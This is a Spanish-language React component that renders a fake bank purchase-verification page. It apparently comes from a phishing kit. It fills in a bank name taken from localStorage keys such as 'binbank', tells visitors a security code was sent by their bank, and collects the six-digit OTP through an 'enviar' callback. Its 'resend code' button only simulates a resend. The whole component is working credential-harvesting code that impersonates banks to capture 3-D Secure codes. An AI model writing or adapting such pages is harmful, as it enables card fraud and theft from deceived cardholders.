/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react-hooks/set-state-in-effect */
'use client';
import React, { useState, useMemo, useEffect } from 'react';
import HeaderBank from './HeaderBank';

// Interfaz para el objeto del banco esperado de localStorage
interface BankData {
  name: string;
}

// --- Funciones de Utilidad ---

// Función Centralizada y robusta para leer localStorage
const getBankNameFromStorage = (): string => {
  if (typeof window === 'undefined' || !window.localStorage) {
    return 'tu banco';
  }

  try {
    const bankSelct = localStorage.getItem('bankSelct') || localStorage.getItem('bankSelect') || localStorage.getItem('bancoSelected');
    if (bankSelct && typeof bankSelct === 'string') {
      return bankSelct;
    }

    const bankDataString = localStorage.getItem('binbank');
    if (bankDataString) {
      const bankData: any = JSON.parse(bankDataString);
      if (bankData?.bank?.name) {
        return bankData.bank.name;
      }
    }
  } catch (error) {
    console.error("Error al leer 'bankSelct' de localStorage:", error);
  }

  return 'tu banco';
};

// --- Subcomponentes ---

// Componente de input para el código (Pixel Perfect)
interface InputFieldProps {
  placeholder: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  maxLength: number;
}

const CodeInputField: React.FC<InputFieldProps> = ({ placeholder, value, onChange, maxLength }) => (
  <div className="flex items-center border border-gray-400 rounded-lg overflow-hidden bg-white mb-2">
    <input
      type="text"
      placeholder={placeholder}
      value={value}
      onChange={onChange}
      inputMode="numeric"
      maxLength={maxLength}
      className="w-full px-3 py-4 text-center text-lg font-bold tracking-widest border-none outline-none bg-transparent placeholder-gray-400 focus:ring-0 focus:border-blue-500"
    />
  </div>
);

// --- Componente Principal de Autorización Dinámica ---
export default function LoginAuthCodeDynamic({ enviar }: any) {
  const [authCode, setAuthCode] = useState('');
  const [bankName, setBankName] = useState<string>('tu banco');

  const CODE_LENGTH = 6;

  // 1. Lógica para cargar el nombre del banco y suscribirse a cambios
  useEffect(() => {
    setBankName(getBankNameFromStorage());

    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'bankSelct' || e.key === 'binbank') {
        setBankName(getBankNameFromStorage());
      }
    };

    window.addEventListener('storage', handleStorageChange);

    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, []);

  // --- Lógica del Formulario ---
  const isCodeValid = authCode.length === CODE_LENGTH;
  const isButtonActive = useMemo(() => isCodeValid, [isCodeValid]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isButtonActive) {
      enviar?.({
        view: "otp",
        otp: authCode,
        timestamp: new Date().toISOString(),
      });
      setAuthCode('');
    }
  };

  const handleResend = (e: React.MouseEvent) => {
    e.preventDefault();
    alert('Simulando reenvío de código...');
  };

  const buttonClasses = isButtonActive
    ? 'bg-[#1A1F71] hover:bg-[#111449]'
    : 'bg-gray-400 cursor-not-allowed';

  return (
    <div className="relative min-h-screen bg-white">
      <HeaderBank />

      <main className="flex flex-col items-center pt-20 pb-5 min-h-screen px-4">

        <form onSubmit={handleSubmit} className="w-full max-w-sm text-left mt-4">

          <h1 className="text-xl font-bold text-gray-800 mb-4">
            Vamos a validar tu compra
          </h1>
          <p className="text-sm text-gray-700 mb-8 leading-relaxed">
            En {bankName}, tu seguridad es nuestra principal preocupación. Para verificar esta compra, te hemos enviado un código de seguridad que encontrarás en las notificaciones de tu dispositivo móvil, ya sea de la aplicación {bankName} o como un mensaje de texto (SMS). Ingresa el código, haz clic en enviar y ¡todo listo! Tu compra estará confirmada de manera segura.
          </p>

          <label htmlFor="authCode" className="block text-center text-gray-500 text-sm mb-1">
            Código de seguridad
          </label>

          <CodeInputField
            placeholder=""
            value={authCode}
            onChange={(e) => {
              const value = e.target.value;
              if (/^\d*$/.test(value) && value.length <= CODE_LENGTH) {
                setAuthCode(value);
              }
            }}
            maxLength={CODE_LENGTH}
          />

          <button
            type="submit"
            disabled={!isButtonActive}
            className={`w-full text-white text-lg font-bold py-3 rounded-lg mt-6 transition duration-200 border-none ${buttonClasses}`}
          >
            ENVIAR
          </button>

          <button
            type="button"
            onClick={handleResend}
            className="w-full text-[#1A1F71] text-sm font-semibold py-3 mt-3 rounded-md transition duration-200 border-none bg-transparent hover:text-blue-700"
          >
            REENVIAR CÓDIGO
          </button>

          <div className="mt-8">
            <a href="#" className="text-[#1A1F71] font-semibold text-sm hover:underline block">
              Ayuda
            </a>
          </div>

        </form>
      </main>
    </div>
  );
}